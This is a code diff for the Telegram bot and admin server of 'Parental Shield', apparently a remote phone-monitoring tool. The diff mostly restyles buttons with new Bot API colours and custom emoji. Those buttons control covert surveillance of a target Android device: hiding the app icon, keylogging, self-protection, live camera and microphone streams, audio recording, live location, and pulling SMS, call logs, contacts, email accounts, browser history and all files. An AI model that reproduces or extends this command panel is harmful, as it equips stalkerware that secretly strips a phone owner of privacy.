@@ -1,5 +1,6 @@
-// Parental Shield — Unified Server v2.0
+// Parental Shield — Unified Server v2.1
 // Web Admin Panel + Telegram Bot + Telegram Mini App
+// Updated for Bot API 9.4+ : colored buttons (style) + custom emoji icons (icon_custom_emoji_id)
 
 require('dotenv').config();
 
@@ -73,102 +74,6 @@ const adminSockets = new Set();
 const botDeviceSelection = new Map();
 
 // ════════════════════════════════════════════════════════════════════
-// TELEGRAM BOT UI HELPERS
-// ════════════════════════════════════════════════════════════════════
-
-// Centralized emoji map for consistent icons
-const EMOJIS = {
-  home: '🏠',
-  download: '⬇️',
-  dcim: '📷',
-  camera: '📸',
-  pictures: '🖼️',
-  whatsapp: '💬',
-  documents: '📄',
-  music: '🎵',
-  movies: '🎬',
-  telegram: '✈️',
-  folder: '📁',
-  file: '📎',
-  lock: '🔒',
-  unlock: '🔓',
-  vibrate: '📳',
-  hide: '🙈',
-  show: '👁️',
-  screentime: '⏱️',
-  block: '🚫',
-  unblock: '✅',
-  photo: '📷',
-  record: '🎤',
-  location: '📍',
-  call: '📞',
-  sms: '💬',
-  contacts: '👥',
-  apps: '📦',
-  files: '📂',
-  getall: '📥',
-  torch_on: '🔦',
-  torch_off: '🔦',
-  live: '🗺️',
-  stop: '⏹',
-  screenshot: '📸',
-  info: 'ℹ️',
-  email: '📧',
-  history: '🌐',
-  keylog: '⌨️',
-  ring: '🔔',
-  usage: '📊',
-  network: '📶',
-  cam: '📹',
-  mic: '🎙️',
-  wifi_on: '📶',
-  wifi_off: '📴',
-  open_url: '🔗',
-  guard: '🛡️',
-  toast: '💬',
-  refresh: '🔄',
-  back: '◀️',
-  settings: '⚙️',
-  status: '📊',
-  devices: '📱',
-  panel: '🖥️',
-  premium: '💎',
-  danger: '⚠️',
-  success: '✅',
-  warning: '⚠️',
-  info: 'ℹ️',
-  up: '⬆️',
-  down: '⬇️',
-  next: '➡️',
-  prev: '⬅️',
-  delete: '🗑️',
-  confirm: '✅',
-  cancel: '❌',
-  noop: '⬜',
-};
-
-// Button builders with color support (Bot API 6.0+)
-function primaryButton(text, callback_data) {
-  return { text, callback_data, color: 'primary' };
-}
-function successButton(text, callback_data) {
-  return { text, callback_data, color: 'success' };
-}
-function dangerButton(text, callback_data) {
-  return { text, callback_data, color: 'danger' };
-}
-function secondaryButton(text, callback_data) {
-  return { text, callback_data }; // default color (secondary)
-}
-function disabledButton(text) {
-  // Simulate disabled state with a dummy callback that will be ignored
-  return { text, callback_data: 'disabled' };
-}
-function webAppButton(text, url, color = 'primary') {
-  return { text, web_app: { url }, color };
-}
-
-// ════════════════════════════════════════════════════════════════════
 // TELEGRAM BOT
 // ════════════════════════════════════════════════════════════════════
 
@@ -184,6 +89,84 @@ function escapeMdCode(text) {
   if (text == null) return '';
   return String(text).replace(/`/g, "'");
 }
+
+// ════════════════════════════════════════════════════════════════════
+// Bot API 9.4+ Button helpers (colored buttons + premium custom emoji)
+// style: "primary" (blue) | "success" (green) | "danger" (red)
+// icon_custom_emoji_id: requires bot owner Premium OR Fragment username
+// ════════════════════════════════════════════════════════════════════
+const BTN_STYLE = {
+  PRIMARY: 'primary',
+  SUCCESS: 'success',
+  DANGER:  'danger',
+};
+
+/**
+ * Create an InlineKeyboardButton with optional style + custom emoji icon.
+ * Extra fields are passed through by node-telegram-bot-api to the Bot API.
+ */
+function ibtn(text, callback_data, opts = {}) {
+  const btn = { text, callback_data };
+  if (opts.style) btn.style = opts.style;
+  if (opts.icon)  btn.icon_custom_emoji_id = String(opts.icon);
+  if (opts.disabled) btn.disabled = true; // Bot API 10.3+
+  return btn;
+}
+
+function ibtnUrl(text, url, opts = {}) {
+  const btn = { text, url };
+  if (opts.style) btn.style = opts.style;
+  if (opts.icon)  btn.icon_custom_emoji_id = String(opts.icon);
+  return btn;
+}
+
+function ibtnWebApp(text, webAppUrl, opts = {}) {
+  const btn = { text, web_app: { url: webAppUrl } };
+  if (opts.style) btn.style = opts.style;
+  if (opts.icon)  btn.icon_custom_emoji_id = String(opts.icon);
+  return btn;
+}
+
+// Custom emoji IDs (from user-provided @TgEmojis lists)
+// Requires bot owner Telegram Premium OR Fragment username for icons to show.
+const EMOJI = {
+  check:      '6057365116838484267', // ✅
+  check2:     '6057565348213825388', // ✅
+  check3:     '5323386314400211783', // ✅
+  cross:      '5956091557525327060', // ❌
+  lock:       '6149752513370266455', // 🔒
+  unlock:     '5890882606668452641', // 🔓
+  shield:     '5442631872305736555', // 🛡️
+  phone:      '6053023544852356700', // 📱
+  settings:   '6149867038673214804', // ⚙️
+  call:       '6149951632349076870', // 📞
+  chat:       '6147871085766387024', // 💬
+  camera:     '5956485766803624269', // 📷
+  video:      '5958646732353966136', // 📹
+  mic:        '5956209170909761466', // 🎙
+  location:   '4958728373900674046', // 📍
+  download:   '6325435393244142578', // 📥
+  refresh:    '6327963337980124903', // 🔄
+  warning:    '5956094645606813545', // ⚠️
+  alert:      '5956216614088085071', // 🚨
+  star:       '6057488120406875339', // ⭐
+  fire:       '6325480498990685241', // 🔥
+  trash:      '4958534924278694938', // 🗑
+  eye:        '5224425934278401310', // 👀
+  ring:       '5956085806564118570', // 🔔
+  wifi:       '5927284851093803771', // 🛜
+  network:    '6057519357704018359', // 🌐
+  battery:    '5913513644049570217', // 🔋
+  game:       '5956051000149152574', // 🎮
+  users:      '6147414775555957124', // 👥
+  info:       '6203791465471022369', // ℹ️
+  rocket:     '5800956853462504394', // 🚀
+  stop:       '6325514936038465701', // 🛑
+  success:    '5956344921941086117', // ✅
+  danger:     '5956556092598129705', // ⛔️
+  arrow:      '6147894617892199810', // ➡️
+  home:       '4958485609464202497', // 🏡
+};
 
 // ════════════════════════════════════════════════════════════════════
 // BOT FILE BROWSER HELPERS
@@ -212,16 +195,16 @@ const FOLDER_SHORTCUTS = {
 };
 
 const PATH_SHORTCUTS = [
-  { text: `${EMOJIS.home} Root`,      path: '/storage/emulated/0' },
-  { text: `${EMOJIS.download} Download`,  path: '/storage/emulated/0/Download' },
-  { text: `${EMOJIS.dcim} DCIM`,      path: '/storage/emulated/0/DCIM' },
-  { text: `${EMOJIS.camera} Camera`,    path: '/storage/emulated/0/DCIM/Camera' },
-  { text: `${EMOJIS.pictures} Pictures`,  path: '/storage/emulated/0/Pictures' },
-  { text: `${EMOJIS.whatsapp} WhatsApp`,  path: '/storage/emulated/0/WhatsApp/Media' },
-  { text: `${EMOJIS.documents} Documents`, path: '/storage/emulated/0/Documents' },
-  { text: `${EMOJIS.music} Music`,     path: '/storage/emulated/0/Music' },
-  { text: `${EMOJIS.movies} Movies`,    path: '/storage/emulated/0/Movies' },
-  { text: `${EMOJIS.telegram} Telegram`,  path: '/storage/emulated/0/Telegram' },
+  { text: '🏠 Root',      path: '/storage/emulated/0' },
+  { text: '⬇️ Download',  path: '/storage/emulated/0/Download' },
+  { text: '📷 DCIM',      path: '/storage/emulated/0/DCIM' },
+  { text: '📸 Camera',    path: '/storage/emulated/0/DCIM/Camera' },
+  { text: '🖼️ Pictures',  path: '/storage/emulated/0/Pictures' },
+  { text: '💬 WhatsApp',  path: '/storage/emulated/0/WhatsApp/Media' },
+  { text: '📄 Documents', path: '/storage/emulated/0/Documents' },
+  { text: '🎵 Music',     path: '/storage/emulated/0/Music' },
+  { text: '🎬 Movies',    path: '/storage/emulated/0/Movies' },
+  { text: '✈️ Telegram',  path: '/storage/emulated/0/Telegram' },
 ];
 
 function getFileCategory(filename) {
@@ -337,10 +320,10 @@ function buildShortcutRows(deviceId) {
   const rows = [];
   let row = [];
   for (const sc of PATH_SHORTCUTS) {
-    row.push(primaryButton(
-      sc.text,
-      `fb:nav:${deviceId}:${getCachedPathKey(sc.path)}:all`
-    ));
+    row.push({
+      text: sc.text,
+      callback_data: `fb:nav:${deviceId}:${getCachedPathKey(sc.path)}:all`
+    });
     if (row.length === 5) {
       rows.push(row);
       row = [];
@@ -360,11 +343,11 @@ function buildBreadcrumbRows(deviceId, curPath) {
   }
   const shown = crumbs.slice(-4);
   if (!shown.length) return [];
-  return [shown.map((c, i) => secondaryButton(
-    (i === 0 && shown.length < crumbs.length ? '…' : '') +
+  return [shown.map((c, i) => ({
+    text: (i === 0 && shown.length < crumbs.length ? '…' : '') +
       (c.path === STORAGE_ROOT ? 'Home' : truncateBtn(c.name, 12)),
-    `fb:nav:${deviceId}:${getCachedPathKey(c.path)}:all`
-  ))];
+    callback_data: `fb:nav:${deviceId}:${getCachedPathKey(c.path)}:all`
+  }))];
 }
 
 function requestDeviceDir(chatId, msgId, deviceId, dirPath, filterExt, page) {
@@ -494,18 +477,18 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt, p
   for (let i = 0; i < presentCats.length; i++) {
     const c = presentCats[i];
     const active = filter === c ? '* ' : '';
-    const btn = secondaryButton(
-      `${active}${getCategoryEmoji(c)} ${c}`,
-      `fb:filter:${deviceId}:${pathKey}:${c}`
-    );
+    const btn = {
+      text: `${active}${getCategoryEmoji(c)} ${c}`,
+      callback_data: `fb:filter:${deviceId}:${pathKey}:${c}`
+    };
     if (i < 3) catRow1.push(btn); else catRow2.push(btn);
   }
   if (catRow1.length) filterButtons.push(catRow1);
   if (catRow2.length) filterButtons.push(catRow2);
 
   filterButtons.push([
-    primaryButton(filter === 'all' ? '* All' : 'All', `fb:filter:${deviceId}:${pathKey}:all`),
-    secondaryButton(filter === '.trashed' ? '* .trashed' : '.trashed', `fb:filter:${deviceId}:${pathKey}:.trashed`),
+    { text: filter === 'all' ? '* All' : 'All', callback_data: `fb:filter:${deviceId}:${pathKey}:all` },
+    { text: filter === '.trashed' ? '* .trashed' : '.trashed', callback_data: `fb:filter:${deviceId}:${pathKey}:.trashed` },
   ]);
 
   const listButtons = [];
@@ -513,38 +496,62 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt, p
     const item = entry.item;
     const full = itemFullPath(item, curPath);
     if (entry.kind === 'dir') {
-      const label = `${EMOJIS.folder} ${truncateBtn(item.name || 'folder', 36)}`;
-      listButtons.push([primaryButton(label, `fb:nav:${deviceId}:${getCachedPathKey(full)}:all`)]);
+      const label = `📁 ${truncateBtn(item.name || 'folder', 36)}`;
+      listButtons.push([{
+        text: label,
+        callback_data: `fb:nav:${deviceId}:${getCachedPathKey(full)}:all`
+      }]);
     } else {
       const emoji = getCategoryEmoji(getFileCategory(item.name));
       const sizeStr = formatSize(item.size);
       const label = `${emoji} ${truncateBtn(item.name, 28)}  (${sizeStr})`;
-      listButtons.push([secondaryButton(label, `fb:file:${deviceId}:${getCachedPathKey(full)}`)]);
+      listButtons.push([{
+        text: label,
+        callback_data: `fb:file:${deviceId}:${getCachedPathKey(full)}`
+      }]);
     }
   }
 
   const pageRow = [];
   if (totalPages > 1) {
     if (safePage > 0) {
-      pageRow.push(secondaryButton(`${EMOJIS.prev} Prev`, `fb:pg:${deviceId}:${pathKey}:${filter}:${safePage - 1}`));
+      pageRow.push({
+        text: '⬅️ Prev',
+        callback_data: `fb:pg:${deviceId}:${pathKey}:${filter}:${safePage - 1}`
+      });
     }
-    pageRow.push(secondaryButton(`${safePage + 1}/${totalPages}`, 'fb:noop'));
+    pageRow.push({
+      text: `${safePage + 1}/${totalPages}`,
+      callback_data: 'fb:noop'
+    });
     if (safePage < totalPages - 1) {
-      pageRow.push(secondaryButton(`Next ${EMOJIS.next}`, `fb:pg:${deviceId}:${pathKey}:${filter}:${safePage + 1}`));
+      pageRow.push({
+        text: 'Next ➡️',
+        callback_data: `fb:pg:${deviceId}:${pathKey}:${filter}:${safePage + 1}`
+      });
     }
   }
 
   const navRow1 = [];
   if (parentPath) {
-    navRow1.push(primaryButton(`${EMOJIS.up} Up`, `fb:nav:${deviceId}:${getCachedPathKey(parentPath)}:all`));
+    navRow1.push({
+      text: '⬆️ Up',
+      callback_data: `fb:nav:${deviceId}:${getCachedPathKey(parentPath)}:all`
+    });
   }
-  navRow1.push(primaryButton(`${EMOJIS.home} Home`, `fb:nav:${deviceId}:${getCachedPathKey(STORAGE_ROOT)}:all`));
-  navRow1.push(secondaryButton(`${EMOJIS.refresh} Refresh`, `fb:nav:${deviceId}:${pathKey}:${filter}`));
+  navRow1.push({
+    text: '🏠 Home',
+    callback_data: `fb:nav:${deviceId}:${getCachedPathKey(STORAGE_ROOT)}:all`
+  });
+  navRow1.push({
+    text: '🔄 Refresh',
+    callback_data: `fb:nav:${deviceId}:${pathKey}:${filter}`
+  });
 
   const navRow2 = [
-    secondaryButton(`${EMOJIS.folder} Path`, `fb:custom:${deviceId}`),
-    primaryButton(`${EMOJIS.getall} All here`, `fb:getall:${deviceId}:${pathKey}`),
-    secondaryButton(`${EMOJIS.back} Device`, `sel:${deviceId}`),
+    { text: '✏️ Path', callback_data: `fb:custom:${deviceId}` },
+    { text: '📥 All here', callback_data: `fb:getall:${deviceId}:${pathKey}` },
+    { text: '◀️ Device', callback_data: `sel:${deviceId}` },
   ];
 
   const keyboard = {
@@ -679,7 +686,7 @@ function notifyAdminSms(deviceId, childName, sender, body, time) {
        `From: \`${escapeMdCode(sender)}\`\n` +
       `Time: ${t}\n\n` +
       `"${body.length > 200 ? escapeMd(body.slice(0,200))+'…' : escapeMd(body)}"`,
-      { reply_markup: { inline_keyboard: [[primaryButton(`📱 View ${childName}`, `sel:${deviceId}`)]] } }
+      { reply_markup: { inline_keyboard: [[{ text: `📱 View ${childName}`, callback_data: `sel:${deviceId}` }]] } }
     );
   } catch (e) { console.error('[BOT] SMS notify error:', e.message); }
 }
@@ -704,7 +711,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
       }
       if (calls.length > 25) text += `\n_…aro ${calls.length-25} ta call_`;
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]] } });
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
 
     } else if (payload.type === 'sms_result') {
       const msgs = payload.messages || [];
@@ -717,7 +724,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
         text += `${read}\`${escapeMdCode(m.from)}\` — ${date}\n_${body}_\n\n`;
       }
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]] } });
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
 
     } else if (payload.type === 'contacts_result') {
       const contacts = payload.contacts || [];
@@ -730,7 +737,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
         let text = `👥 *Contacts — ${escDev}* (${contacts.length})\n\n`;
         for (const c of contacts) text += `👤 *${escapeMd(c.name)}*  \`${escapeMdCode(c.number)}\`\n`;
         bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
-          reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]] } });
+          reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
       }
 
     } else if (payload.type === 'installed_apps_result') {
@@ -748,7 +755,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
       let text = `📧 *Email Accounts — ${escDev}*\n\n`;
       for (const a of accounts) text += `✉️ \`${escapeMdCode(a.email)}\`\n`;
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]] } });
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
 
     } else if (payload.type === 'browser_history_result') {
       const items = payload.items || [];
@@ -769,7 +776,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
       }
       if (entries.length > 30) text += `\n_…aro ${entries.length-30} ta entry_`;
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]] } });
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
 
     } else if (payload.type === 'app_usage_result') {
       const items = payload.items || [];
@@ -782,7 +789,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
         text += `${bar} ${escapeMd(u.app)} — *${mins} min*\n`;
       }
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]] } });
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
 
     } else if (payload.type === 'network_info_result') {
       if (payload.error) { bot.sendMessage(chatId, `📶 *Network — ${escDev}*\n\n❌ ${escapeMd(payload.error)}`, { parse_mode: 'Markdown' }); return; }
@@ -792,7 +799,7 @@ function handleBotDataResult(chatId, deviceId, payload) {
       if (payload.ssid) text += `📛 SSID: \`${escapeMdCode(payload.ssid)}\`\n`;
       if (payload.rssi && payload.rssi > -127) text += `📶 Signal: ${payload.rssi} dBm\n`;
       bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
-        reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]] } });
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
     }
   } catch (e) { console.error('[BOT] Data result error:', e.message); }
 }
@@ -827,10 +834,17 @@ function initTelegramBot() {
   }
 
   // ── Keyboard builders ─────────────────────────────────────────────────
+  // Reply keyboard also supports style + icon_custom_emoji_id (Bot API 9.4+)
   const MAIN_REPLY_KB = {
     keyboard: [
-      [{ text: `${EMOJIS.devices} Devices` }, { text: `${EMOJIS.panel} Full Panel` }],
-      [{ text: `${EMOJIS.status} Status` },  { text: `${EMOJIS.settings} Settings`  }],
+      [
+        { text: "📱 Devices", style: BTN_STYLE.PRIMARY },
+        { text: "🖥️ Full Panel", style: BTN_STYLE.PRIMARY },
+      ],
+      [
+        { text: "📊 Status", style: BTN_STYLE.PRIMARY },
+        { text: "⚙️ Settings", style: BTN_STYLE.PRIMARY },
+      ],
     ],
     resize_keyboard: true,
     persistent: true,
@@ -842,7 +856,12 @@ function initTelegramBot() {
     for (const [id, dev] of childDevices.entries()) {
       const bat = dev.battery || 0;
       const icon = bat > 60 ? "🟢" : bat > 20 ? "🟡" : "🔴";
-      rows.push([primaryButton(`${icon} ${dev.childName}  •  🔋${bat}%  •  ${dev.activeApp || "Home"}`, `sel:${id}`)]);
+      // primary style for device selection
+      rows.push([
+        ibtn(`${icon} ${dev.childName}  •  🔋${bat}%  •  ${dev.activeApp || "Home"}`, `sel:${id}`, {
+          style: BTN_STYLE.PRIMARY
+        })
+      ]);
     }
     return { inline_keyboard: rows };
   }
@@ -850,91 +869,97 @@ function initTelegramBot() {
   function deviceActionInlineKB(deviceId) {
     const miniUrl = PUBLIC_URL ? `${PUBLIC_URL}/?tg=1` : null;
     const rows = [
+      // Security / control
       [
-        dangerButton(`${EMOJIS.lock} Lock Screen`, `act:lock:${deviceId}`),
-        secondaryButton(`${EMOJIS.vibrate} Vibrate`, `act:buzz:${deviceId}`),
+        ibtn("Lock Screen", `act:lock:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.lock }),
+        ibtn("Vibrate",     `act:buzz:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.alert }),
       ],
       [
-        secondaryButton(`${EMOJIS.hide} Hide Icon`, `act:hide_icon:${deviceId}`),
-        secondaryButton(`${EMOJIS.show} Show Icon`, `act:unhide_icon:${deviceId}`),
+        ibtn("Hide Icon", `act:hide_icon:${deviceId}`,   { style: BTN_STYLE.DANGER,  icon: EMOJI.eye }),
+        ibtn("Show Icon", `act:unhide_icon:${deviceId}`, { style: BTN_STYLE.SUCCESS, icon: EMOJI.check }),
       ],
       [
-        primaryButton(`${EMOJIS.screentime} Screen Time Limit`, `act:screentime:${deviceId}`),
-        dangerButton(`${EMOJIS.block} Block Apps`, `act:policy:${deviceId}`),
+        ibtn("Screen Time", `act:screentime:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.battery }),
+        ibtn("Block Apps",  `act:policy:${deviceId}`,     { style: BTN_STYLE.DANGER,  icon: EMOJI.danger }),
+      ],
+      // Media capture
+      [
+        ibtn("Cam Front", `act:photo_front:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.camera }),
+        ibtn("Cam Back",  `act:photo_back:${deviceId}`,  { style: BTN_STYLE.PRIMARY, icon: EMOJI.camera }),
       ],
       [
-        primaryButton(`${EMOJIS.photo} Camera (Front)`, `act:photo_front:${deviceId}`),
-        primaryButton(`${EMOJIS.photo} Camera (Back)`, `act:photo_back:${deviceId}`),
+        ibtn("Record 30s", `act:record_audio:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.mic }),
+        ibtn("Location",   `act:get_location:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.location }),
+      ],
+      // Data
+      [
+        ibtn("Call Log", `act:call_log:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.call }),
+        ibtn("SMS",      `act:sms:${deviceId}`,      { style: BTN_STYLE.PRIMARY, icon: EMOJI.chat }),
       ],
       [
-        primaryButton(`${EMOJIS.record} Record 30s`, `act:record_audio:${deviceId}`),
-        primaryButton(`${EMOJIS.location} Location`, `act:get_location:${deviceId}`),
+        ibtn("Contacts", `act:contacts:${deviceId}`,       { style: BTN_STYLE.PRIMARY, icon: EMOJI.users }),
+        ibtn("Apps",     `act:installed_apps:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.phone }),
       ],
       [
-        secondaryButton(`${EMOJIS.call} Call Log`, `act:call_log:${deviceId}`),
-        secondaryButton(`${EMOJIS.sms} SMS`, `act:sms:${deviceId}`),
+        ibtn("Files",         `act:files:${deviceId}`,         { style: BTN_STYLE.PRIMARY, icon: EMOJI.download }),
+        ibtn("Get All Files", `act:get_all_files:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.download }),
       ],
       [
-        secondaryButton(`${EMOJIS.contacts} Contacts`, `act:contacts:${deviceId}`),
-        secondaryButton(`${EMOJIS.apps} Installed Apps`, `act:installed_apps:${deviceId}`),
+        ibtn("Torch ON",  `act:torch_on:${deviceId}`,  { style: BTN_STYLE.SUCCESS, icon: EMOJI.star }),
+        ibtn("Torch OFF", `act:torch_off:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.stop }),
       ],
       [
-        primaryButton(`${EMOJIS.files} Files`, `act:files:${deviceId}`),
-        primaryButton(`${EMOJIS.getall} Get All Files`, `act:get_all_files:${deviceId}`),
+        ibtn("Live Location", `act:start_live_location:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.location }),
+        ibtn("Stop LiveLoc",  `act:stop_live_location:${deviceId}`,  { style: BTN_STYLE.DANGER,  icon: EMOJI.stop }),
       ],
       [
-        secondaryButton(`${EMOJIS.torch_on} Torch ON`, `act:torch_on:${deviceId}`),
-        secondaryButton(`${EMOJIS.torch_off} Torch OFF`, `act:torch_off:${deviceId}`),
+        ibtn("Screenshot",  `act:take_screenshot:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.camera }),
+        ibtn("Device Info", `act:get_info:${deviceId}`,        { style: BTN_STYLE.PRIMARY, icon: EMOJI.info }),
       ],
       [
-        primaryButton(`${EMOJIS.live} Live Location`, `act:start_live_location:${deviceId}`),
-        dangerButton(`${EMOJIS.stop} Stop LiveLoc`, `act:stop_live_location:${deviceId}`),
+        ibtn("Email",   `act:email_accounts:${deviceId}`,  { style: BTN_STYLE.PRIMARY, icon: EMOJI.chat }),
+        ibtn("History", `act:browser_history:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.network }),
       ],
       [
-        secondaryButton(`${EMOJIS.screenshot} Screenshot`, `act:take_screenshot:${deviceId}`),
-        secondaryButton(`${EMOJIS.info} Device Info`, `act:get_info:${deviceId}`),
+        ibtn("Keylog",    `act:keylog:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.eye }),
+        ibtn("Ring Loud", `act:ring:${deviceId}`,   { style: BTN_STYLE.DANGER,  icon: EMOJI.ring }),
       ],
       [
-        secondaryButton(`${EMOJIS.email} Email Accounts`, `act:email_accounts:${deviceId}`),
-        secondaryButton(`${EMOJIS.history} History`, `act:browser_history:${deviceId}`),
+        ibtn("App Usage",    `act:app_usage:${deviceId}`,    { style: BTN_STYLE.PRIMARY, icon: EMOJI.game }),
+        ibtn("Network Info", `act:network_info:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.wifi }),
+      ],
+      // Live streams
+      [
+        ibtn("Cam LIVE Front", `act:cam_stream_front:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.video }),
+        ibtn("Cam LIVE Back",  `act:cam_stream_back:${deviceId}`,  { style: BTN_STYLE.PRIMARY, icon: EMOJI.video }),
       ],
       [
-        secondaryButton(`${EMOJIS.keylog} Keylog`, `act:keylog:${deviceId}`),
-        dangerButton(`${EMOJIS.ring} Ring Loud`, `act:ring:${deviceId}`),
+        ibtn("Mic LIVE",     `act:mic_stream:${deviceId}`,   { style: BTN_STYLE.PRIMARY, icon: EMOJI.mic }),
+        ibtn("Stop Streams", `act:stop_streams:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.stop }),
       ],
       [
-        secondaryButton(`${EMOJIS.usage} App Usage`, `act:app_usage:${deviceId}`),
-        secondaryButton(`${EMOJIS.network} Network Info`, `act:network_info:${deviceId}`),
+        ibtn("WiFi ON",  `act:wifi_on:${deviceId}`,  { style: BTN_STYLE.SUCCESS, icon: EMOJI.wifi }),
+        ibtn("WiFi OFF", `act:wifi_off:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.danger }),
       ],
       [
-        dangerButton(`${EMOJIS.cam} Cam LIVE Front`, `act:cam_stream_front:${deviceId}`),
-        dangerButton(`${EMOJIS.cam} Cam LIVE Back`, `act:cam_stream_back:${deviceId}`),
+        ibtn("Block App",   `act:block_app:${deviceId}`,   { style: BTN_STYLE.DANGER,  icon: EMOJI.cross }),
+        ibtn("Unblock App", `act:unblock_app:${deviceId}`, { style: BTN_STYLE.SUCCESS, icon: EMOJI.check }),
       ],
       [
-        dangerButton(`${EMOJIS.mic} Mic LIVE`, `act:mic_stream:${deviceId}`),
-        dangerButton(`${EMOJIS.stop} Stop Streams`, `act:stop_streams:${deviceId}`),
+        ibtn("Open URL", `act:open_url:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.network }),
       ],
       [
-        secondaryButton(`${EMOJIS.wifi_on} WiFi ON`, `act:wifi_on:${deviceId}`),
-        secondaryButton(`${EMOJIS.wifi_off} WiFi OFF`, `act:wifi_off:${deviceId}`),
+        ibtn("Self-Protect", `act:guard:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.shield }),
       ],
       [
-        dangerButton(`${EMOJIS.block} Block App`, `act:block_app:${deviceId}`),
-        successButton(`${EMOJIS.unblock} Unblock App`, `act:unblock_app:${deviceId}`),
-      ],
-      [
-        secondaryButton(`${EMOJIS.open_url} Open URL`, `act:open_url:${deviceId}`),
-      ],
-      [
-        primaryButton(`${EMOJIS.guard} Self-Protect`, `act:guard:${deviceId}`),
-      ],
-      [
-        secondaryButton(`${EMOJIS.toast} Show Toast`, `act:toast:${deviceId}`),
-        secondaryButton(`${EMOJIS.refresh} Refresh`, `sel:${deviceId}`),
+        ibtn("Show Toast", `act:toast:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.chat }),
+        ibtn("Refresh",    `sel:${deviceId}`,       { style: BTN_STYLE.PRIMARY, icon: EMOJI.refresh }),
       ],
     ];
     if (miniUrl) {
-      rows.push([webAppButton(`${EMOJIS.panel} Open Full Admin Panel`, miniUrl, 'primary')]);
+      rows.push([
+        ibtnWebApp("Open Full Admin Panel", miniUrl, { style: BTN_STYLE.PRIMARY, icon: EMOJI.rocket })
+      ]);
     }
     return { inline_keyboard: rows };
   }
@@ -955,7 +980,7 @@ function initTelegramBot() {
     const opts = {
       parse_mode: "Markdown",
       reply_markup: childDevices.size === 0
-        ? { inline_keyboard: [[primaryButton(`${EMOJIS.refresh} Refresh`, "menu:devices")]] }
+        ? { inline_keyboard: [[ibtn("Refresh", "menu:devices", { style: BTN_STYLE.PRIMARY, icon: EMOJI.refresh })]] }
         : deviceListInlineKB()
     };
 
@@ -1020,7 +1045,7 @@ function initTelegramBot() {
     if (!devId) {
       bot.sendMessage(chatId, "⚠️ Kono device selected nai.\n\n📱 *Devices* button theke aage device select koro.", {
         parse_mode: "Markdown",
-        reply_markup: { inline_keyboard: [[primaryButton(`${EMOJIS.devices} Device List`, "menu:devices")]] }
+        reply_markup: { inline_keyboard: [[{ text: "📱 Device List", callback_data: "menu:devices" }]] }
       });
       return;
     }
@@ -1052,7 +1077,7 @@ function initTelegramBot() {
       return;
     }
 
-    const MENU_TEXTS = [`${EMOJIS.devices} Devices`, `${EMOJIS.status} Status`, `${EMOJIS.settings} Settings`, `${EMOJIS.panel} Full Panel`];
+    const MENU_TEXTS = ['📱 Devices', '📊 Status', '⚙️ Settings', '🖥️ Full Panel'];
     if (state.awaitingInput && MENU_TEXTS.includes(text)) {
       state.awaitingInput = null;
     }
@@ -1079,7 +1104,7 @@ function initTelegramBot() {
         : `*${minutes} minute* = ${Math.floor(minutes/60)}h ${minutes%60}m`;
       bot.sendMessage(chatId,
